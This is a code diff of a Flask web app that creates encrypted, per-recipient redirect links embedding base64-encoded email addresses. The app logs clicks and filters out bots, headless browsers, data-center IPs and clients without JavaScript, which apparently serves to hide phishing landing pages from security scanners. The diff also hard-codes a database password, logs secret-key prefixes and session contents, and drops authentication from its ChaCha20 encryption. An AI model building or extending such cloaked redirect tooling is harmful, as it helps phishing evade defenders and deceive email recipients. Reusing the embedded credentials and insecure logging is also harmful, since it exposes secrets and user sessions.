@@ -26,7 +26,7 @@ load_dotenv()
 # Configure logging
 logging.basicConfig(
     level=logging.DEBUG,
-    format='%(asctime)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(levelname)s | %(message)s',
     handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger(__name__)
@@ -36,38 +36,30 @@ logger.debug("Initializing Flask app")
 FLASK_SECRET_KEY = os.getenv("FLASK_SECRET_KEY", secrets.token_hex(32))
 ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", secrets.token_bytes(32))
 VALKEY_HOST = os.getenv("VALKEY_HOST", "valkey-137d99b9-reign.e.aivencloud.com")
-VALKEY_PORT = int(os.getenv("VALKEY_PORT", 25708))
+VALKEY_PORT = int(os.getenv("VALKEY_PORT", 25714))
 VALKEY_USERNAME = os.getenv("VALKEY_USERNAME", "default")
 VALKEY_PASSWORD = os.getenv("VALKEY_PASSWORD", "AVNS_Yzfa75IOznjCrZJIyzI")
 USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
 DATA_RETENTION_DAYS = int(os.getenv("DATA_RETENTION_DAYS", 90))
 GEOIP_PROVIDER = os.getenv("GEOIP_PROVIDER", "ipapi")
 
-# Log key for debugging
+# Validate keys
+logger.debug(f"FLASK_SECRET_KEY: {FLASK_SECRET_KEY[:8]}...")
 logger.debug(f"ENCRYPTION_KEY hash: {hashlib.sha256(ENCRYPTION_KEY).hexdigest()[:10]}...")
-
-# Dynamic domain handling
-def get_base_domain():
-    try:
-        host = request.host
-        parts = host.split('.')
-        if len(parts) >= 2:
-            return '.'.join(parts[-2:])
-        return host
-    except Exception as e:
-        logger.error(f"Error getting base domain: {str(e)}")
-        return "nvclerks.com"
+if len(ENCRYPTION_KEY) != 32:
+    logger.error("ENCRYPTION_KEY must be 32 bytes")
+    raise ValueError("Invalid ENCRYPTION_KEY length")
 
 # Configuration
 try:
     app.config['SECRET_KEY'] = FLASK_SECRET_KEY
     app.config['SESSION_COOKIE_HTTPONLY'] = True
     app.config['SESSION_COOKIE_SECURE'] = True
-    app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # Relaxed for Vercel
     app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=1)
     logger.debug("Flask configuration set successfully")
 except Exception as e:
-    logger.error(f"Error setting Flask config: {str(e)}", exc_info=True)
+    logger.error(f"Error setting Flask config: {str(e)}")
     raise
 
 # Valkey initialization
@@ -82,9 +74,9 @@ try:
         ssl=True
     )
     valkey_client.ping()
-    logger.debug("Valkey connection established successfully")
+    logger.debug("Valkey connection established")
 except Exception as e:
-    logger.error(f"Valkey connection failed: {str(e)}", exc_info=True)
+    logger.error(f"Valkey connection failed: {str(e)}")
     valkey_client = None
 
 # Custom Jinja2 filter for datetime
@@ -106,18 +98,18 @@ def is_bot(user_agent, headers, ip, endpoint):
             logger.debug(f"IP {ip} is authenticated, skipping bot check")
             return False, "Authenticated user"
         if endpoint.startswith("/") and endpoint != "/login":
-            logger.debug(f"IP {ip} allowed for generated link {endpoint}, skipping JS verification")
+            logger.debug(f"IP {ip} allowed for generated link {endpoint}")
             return False, "Generated link access"
         if not user_agent:
-            logger.warning(f"Blocked IP {ip}: No User-Agent provided")
+            logger.warning(f"Blocked IP {ip}: No User-Agent")
             return True, "Missing User-Agent"
         user_agent_lower = user_agent.lower()
         for pattern in BOT_PATTERNS:
             if pattern in user_agent_lower:
-                logger.warning(f"Blocked IP {ip}: Known bot pattern {pattern}")
+                logger.warning(f"Blocked IP {ip}: Bot pattern {pattern}")
                 return True, f"Known bot: {pattern}"
         if 'HeadlessChrome' in user_agent or 'PhantomJS' in user_agent:
-            logger.warning(f"Blocked IP {ip}: Headless browser detected")
+            logger.warning(f"Blocked IP {ip}: Headless browser")
             return True, "Headless browser"
         if valkey_client:
             try:
@@ -131,11 +123,11 @@ def is_bot(user_agent, headers, ip, endpoint):
             except Exception as e:
                 logger.error(f"Valkey error in bot check: {str(e)}")
         if ip.startswith(('162.249.', '5.62.', '84.39.')):
-            logger.warning(f"Blocked IP {ip}: Data center IP range")
+            logger.warning(f"Blocked IP {ip}: Data center IP")
             return True, "Data center IP"
         if endpoint == "/login" and headers.get('Referer') and 'Mozilla' in user_agent:
-            logger.debug(f"IP {ip} allowed for /login with valid headers")
-            return False, "Likely human (login attempt)"
+            logger.debug(f"IP {ip} allowed for /login")
+            return False, "Likely human (login)"
         if 'js_verified' not in session:
             logger.warning(f"Blocked IP {ip}: Missing JS verification")
             return True, "Missing JS verification"
@@ -339,12 +331,11 @@ def encrypt_chacha20_poly1305(payload):
     try:
         logger.debug(f"chacha20_poly1305 input payload: {payload[:50]}...")
         nonce = secrets.token_bytes(12)
-        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, nonce), modes.Poly1305(), backend=default_backend())
+        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, nonce), mode=None, backend=default_backend())
         encryptor = cipher.encryptor()
         data = payload.encode()
         ciphertext = encryptor.update(data) + encryptor.finalize()
-        tag = encryptor.tag
-        result = base64.urlsafe_b64encode(nonce + tag + ciphertext).decode()
+        result = base64.urlsafe_b64encode(nonce + ciphertext).decode()
         logger.debug(f"chacha20_poly1305 encrypted: {result[:20]}...")
         return result
     except Exception as e:
@@ -356,9 +347,8 @@ def decrypt_chacha20_poly1305(encrypted):
         logger.debug(f"chacha20_poly1305 decrypting: {encrypted[:20]}...")
         data = base64.urlsafe_b64decode(encrypted)
         nonce = data[:12]
-        tag = data[12:28]
-        ciphertext = data[28:]
-        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, nonce), modes.Poly1305(tag), backend=default_backend())
+        ciphertext = data[12:]
+        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, nonce), mode=None, backend=default_backend())
         decryptor = cipher.decryptor()
         result = (decryptor.update(ciphertext) + decryptor.finalize()).decode()
         logger.debug(f"chacha20_poly1305 decrypted: {result[:50]}...")
@@ -460,9 +450,10 @@ def login_required(f):
     def decorated_function(*args, **kwargs):
         try:
             if 'username' not in session:
-                logger.debug(f"Redirecting to login from {request.url}")
+                logger.debug(f"Redirecting to login from {request.url}, session: {session}")
                 return redirect(url_for('login', next=request.url))
-            logger.debug(f"Authenticated user: {session['username']}")
+            logger.debug(f"Authenticated user: {session['username']}, session: {session}")
+            session.modified = True
             return f(*args, **kwargs)
         except Exception as e:
             logger.error(f"Error in login_required: {str(e)}")
@@ -490,6 +481,7 @@ def log_visitor():
         referer = headers.get("Referer", "")
         session_start = session.get('session_start', int(time.time()))
         session['session_start'] = session_start
+        session.modified = True
         ua = parse(user_agent)
         device = "Desktop" if not ua.is_mobile else "Android" if "Android" in user_agent else "iPhone" if "iPhone" in user_agent else "Mobile"
         app = "Outlook" if "Outlook" in user_agent else ua.browser.family if ua.browser.family else "Unknown"
@@ -531,12 +523,13 @@ def log_visitor():
                 logger.error(f"Valkey error logging visitor: {str(e)}")
     except Exception as e:
         logger.error(f"Error in log_visitor: {str(e)}")
+        session.modified = True
 
 @app.route("/login", methods=["GET", "POST"])
 @rate_limit(limit=5, per=60)
 def login():
     try:
-        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}")
+        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}, session: {session}")
         if request.method == "POST":
             username = request.form.get("username", "").strip()
             logger.debug(f"Login attempt with username: {username}")
@@ -545,7 +538,7 @@ def login():
                 session['username'] = username
                 session.permanent = True
                 session.modified = True
-                logger.debug(f"User {username} logged in")
+                logger.debug(f"User {username} logged in, session: {session}")
                 next_url = request.form.get('next') or url_for('dashboard')
                 logger.debug(f"Redirecting to {next_url}")
                 return redirect(next_url)
@@ -683,6 +676,7 @@ def login():
         """)
     except Exception as e:
         logger.error(f"Error in login: {str(e)}")
+        session.modified = True
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -708,11 +702,13 @@ def index():
         logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}")
         if 'username' in session:
             logger.debug(f"User {session['username']} redirecting to dashboard")
+            session.modified = True
             return redirect(url_for('dashboard'))
         logger.debug("No user session, redirecting to login")
         return redirect(url_for('login'))
     except Exception as e:
         logger.error(f"Error in index: {str(e)}")
+        session.modified = True
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -738,32 +734,36 @@ def dashboard():
     try:
         if 'username' not in session:
             logger.error("Session missing username, redirecting to login")
+            session.modified = True
             return redirect(url_for('login'))
         username = session['username']
-        logger.debug(f"Accessing dashboard for user: {username}")
+        logger.debug(f"Accessing dashboard for user: {username}, session: {session}")
 
         base_domain = get_base_domain()
         error = None
 
         if request.method == "POST":
             logger.debug(f"Processing POST form data: {request.form}")
-            subdomain = request.form.get("subdomain", "default")
-            randomstring1 = request.form.get("randomstring1", "default")
-            base64email = request.form.get("base64email", "default")
-            destination_link = request.form.get("destination_link", "https://example.com")
-            randomstring2 = request.form.get("randomstring2", generate_random_string(8))
+            subdomain = request.form.get("subdomain", "default").strip()
+            randomstring1 = request.form.get("randomstring1", "default").strip()
+            base64email = request.form.get("base64email", "default").strip()
+            destination_link = request.form.get("destination_link", "https://example.com").strip()
+            randomstring2 = request.form.get("randomstring2", generate_random_string(8)).strip()
             analytics_enabled = request.form.get("analytics_enabled", "off") == "on"
             try:
                 expiry = int(request.form.get("expiry", 86400))
-            except ValueError:
-                logger.error("Invalid expiry value, defaulting to 86400")
+                if expiry < 0:
+                    raise ValueError("Expiry must be non-negative")
+            except ValueError as e:
+                logger.error(f"Invalid expiry value: {str(e)}")
                 expiry = 86400
+                error = "Invalid expiry, defaulting to 1 day"
 
-            if not re.match(r"^https?://", destination_link):
-                error = "Invalid URL"
+            if not re.match(r"^https?://[^\s/$.?#].[^\s]*$", destination_link):
+                error = "Invalid URL (must start with http:// or https://)"
                 logger.warning(f"Invalid destination_link: {destination_link}")
             elif not (2 <= len(subdomain) <= 100 and re.match(r"^[A-Za-z0-9-]{2,100}$", subdomain)):
-                error = "Subdomain must be 2-100 characters (letters, numbers, or hyphens)"
+                error = "Subdomain must be 2-100 characters (letters, numbers, hyphens)"
                 logger.warning(f"Invalid subdomain: {subdomain}")
             elif not (2 <= len(randomstring1) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", randomstring1)):
                 error = "Randomstring1 must be 2-100 characters (letters, numbers, _, @, .)"
@@ -780,8 +780,6 @@ def dashboard():
                 path_segment = f"{randomstring1}{base64_email}{randomstring2}"
                 endpoint = generate_random_string(8)
                 encryption_methods = ['heap_x3', 'pow', 'chacha20_poly1305', 'aes_gcm_alt', 'fern128']
-                method = secrets.choice(encryption_methods)
-                logger.debug(f"Selected encryption method: {method}")
                 fingerprint = generate_fingerprint()
                 expiry_timestamp = int(time.time()) + expiry
                 try:
@@ -798,20 +796,28 @@ def dashboard():
                     error = "Invalid payload data"
 
                 if not error:
-                    try:
-                        if method == 'heap_x3':
-                            encrypted_payload = encrypt_heap_x3(payload, fingerprint)
-                        elif method == 'pow':
-                            encrypted_payload = encrypt_pow(payload)
-                        elif method == 'chacha20_poly1305':
-                            encrypted_payload = encrypt_chacha20_poly1305(payload)
-                        elif method == 'aes_gcm_alt':
-                            encrypted_payload = encrypt_aes_gcm_alt(payload)
-                        else:
-                            encrypted_payload = encrypt_fern128(payload)
-                        logger.debug(f"Encrypted payload: {encrypted_payload[:50]}...")
-                    except Exception as e:
-                        logger.error(f"Encryption failed with {method}: {str(e)}")
+                    encrypted_payload = None
+                    for method in encryption_methods:
+                        try:
+                            logger.debug(f"Attempting encryption with {method}")
+                            if method == 'heap_x3':
+                                encrypted_payload = encrypt_heap_x3(payload, fingerprint)
+                            elif method == 'pow':
+                                encrypted_payload = encrypt_pow(payload)
+                            elif method == 'chacha20_poly1305':
+                                encrypted_payload = encrypt_chacha20_poly1305(payload)
+                            elif method == 'aes_gcm_alt':
+                                encrypted_payload = encrypt_aes_gcm_alt(payload)
+                            else:
+                                encrypted_payload = encrypt_fern128(payload)
+                            logger.debug(f"Encrypted payload with {method}: {encrypted_payload[:50]}...")
+                            break
+                        except Exception as e:
+                            logger.warning(f"Encryption failed with {method}: {str(e)}")
+                            continue
+
+                    if not encrypted_payload:
+                        logger.error("All encryption methods failed")
                         error = "Failed to encrypt payload"
 
                 if not error:
@@ -848,6 +854,7 @@ def dashboard():
 
                 if not error:
                     logger.debug("URL generation successful")
+                    session.modified = True
                     return redirect(url_for('dashboard'))
 
         urls = []
@@ -986,6 +993,7 @@ def dashboard():
         primary_color = f"#{theme_seed}"
 
         logger.debug(f"Rendering dashboard template for user: {username}")
+        session.modified = True
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -1376,6 +1384,7 @@ def dashboard():
            primary_color=primary_color, error=error, valkey_error=valkey_error)
     except Exception as e:
         logger.error(f"Dashboard error for user {username}: {str(e)}")
+        session.modified = True
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -1399,21 +1408,26 @@ def dashboard():
 def toggle_analytics(url_id):
     try:
         username = session['username']
+        logger.debug(f"Toggling analytics for URL {url_id}, user: {username}")
         if valkey_client:
             key = f"user:{username}:url:{url_id}"
             if not valkey_client.exists(key):
                 logger.warning(f"URL {url_id} not found for user {username}")
+                session.modified = True
                 return jsonify({"status": "error", "message": "URL not found"}), 404
             current = valkey_client.hget(key, "analytics_enabled")
             new_value = "0" if current == "1" else "1"
             valkey_client.hset(key, "analytics_enabled", new_value)
             logger.debug(f"Toggled analytics for URL {url_id} to {new_value}")
+            session.modified = True
             return jsonify({"status": "ok"}), 200
         else:
             logger.warning("Valkey unavailable for toggle_analytics")
+            session.modified = True
             return jsonify({"status": "error", "message": "Database unavailable"}), 500
     except Exception as e:
         logger.error(f"Error in toggle_analytics: {str(e)}")
+        session.modified = True
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
 @app.route("/clear_views/<url_id>", methods=["GET"])
@@ -1421,17 +1435,21 @@ def toggle_analytics(url_id):
 def clear_views(url_id):
     try:
         username = session['username']
+        logger.debug(f"Clearing views for URL {url_id}, user: {username}, session: {session}")
         if valkey_client:
             key = f"user:{username}:url:{url_id}"
             if not valkey_client.exists(key):
                 logger.warning(f"URL {url_id} not found for user {username}")
+                session.modified = True
                 abort(404, "URL not found")
             valkey_client.delete(f"{key}:visits")
             valkey_client.hset(key, "clicks", 0)
             logger.debug(f"Cleared views for URL {url_id}")
+            session.modified = True
             return redirect(url_for('dashboard'))
         else:
             logger.warning("Valkey unavailable for clear_views")
+            session.modified = True
             return render_template_string("""
                 <!DOCTYPE html>
                 <html lang="en">
@@ -1451,6 +1469,7 @@ def clear_views(url_id):
             """), 500
     except Exception as e:
         logger.error(f"Error in clear_views: {str(e)}")
+        session.modified = True
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -1474,17 +1493,20 @@ def clear_views(url_id):
 def delete_url(url_id):
     try:
         username = session['username']
-        logger.debug(f"Deleting URL {url_id} for user: {username}")
+        logger.debug(f"Deleting URL {url_id} for user: {username}, session: {session}")
         if valkey_client:
             key = f"user:{username}:url:{url_id}"
             if not valkey_client.exists(key):
                 logger.warning(f"URL {url_id} not found for user {username}")
+                session.modified = True
                 abort(404, "URL not found")
             valkey_client.delete(key, f"{key}:visits")
             logger.debug(f"Deleted URL {url_id}")
+            session.modified = True
             return redirect(url_for('dashboard'))
         else:
             logger.warning("Valkey unavailable for delete_url")
+            session.modified = True
             return render_template_string("""
                 <!DOCTYPE html>
                 <html lang="en">
@@ -1504,7 +1526,7 @@ def delete_url(url_id):
             """), 500
     except Exception as e:
         logger.error(f"Error in delete_url: {str(e)}")
-        session.modified = True  # Ensure session persists
+        session.modified = True
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -1528,7 +1550,7 @@ def delete_url(url_id):
 def export_visitors():
     try:
         username = session['username']
-        logger.debug(f"Exporting visitor data for user: {username}")
+        logger.debug(f"Exporting visitor data for user: {username}, session: {session}")
         if valkey_client:
             try:
                 visitor_keys = valkey_client.keys(f"user:{username}:visitor:*")
@@ -1637,12 +1659,13 @@ def export_visitors():
 def export(index):
     try:
         username = session['username']
-        logger.debug(f"Exporting URL data for user: {username}, index: {index}")
+        logger.debug(f"Exporting URL data for user: {username}, index: {index}, session: {session}")
         if valkey_client:
             try:
                 url_keys = valkey_client.keys(f"user:{username}:url:*")
                 if index <= 0 or index > len(url_keys):
                     logger.warning(f"Invalid export index {index} for user {username}")
+                    session.modified = True
                     abort(404, "URL not found")
                 key = url_keys[index-1]
                 url_id = key.split(':')[-1]
@@ -1742,6 +1765,7 @@ def challenge():
         data = request.get_json()
         if not data or 'challenge' not in data or not isinstance(data['challenge'], (int, float)):
             logger.warning("Invalid JS challenge")
+            session.modified = True
             return jsonify({"status": "denied"}), 403
         session['js_verified'] = True
         session.permanent = True
@@ -1846,6 +1870,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
 
         if is_bot_flag or asn_blocked:
             logger.warning(f"Blocked redirect for IP {ip}: {bot_reason}")
+            session.modified = True
             abort(403, f"Access denied: {bot_reason}")
 
         try:
@@ -1853,6 +1878,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             logger.debug(f"Unquoted payload: {encrypted_payload[:50]}...")
         except Exception as e:
             logger.error(f"Error unquoting payload: {str(e)}")
+            session.modified = True
             abort(400, "Invalid payload format")
 
         payload = None
@@ -1881,6 +1907,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
 
         if not payload:
             logger.error(f"All decryption methods failed for payload: {encrypted_payload[:50]}...")
+            session.modified = True
             abort(400, "Invalid payload")
 
         try:
@@ -1889,13 +1916,16 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             expiry = data.get("expiry", float('inf'))
             if not redirect_url or not re.match(r"^https?://", redirect_url):
                 logger.error(f"Invalid redirect URL: {redirect_url}")
+                session.modified = True
                 abort(400, "Invalid redirect URL")
             if time.time() > expiry:
                 logger.warning("URL expired")
+                session.modified = True
                 abort(410, "URL expired")
             logger.debug(f"Parsed payload: redirect_url={redirect_url}")
         except Exception as e:
             logger.error(f"Payload parsing error: {str(e)}")
+            session.modified = True
             abort(400, "Invalid payload")
 
         final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
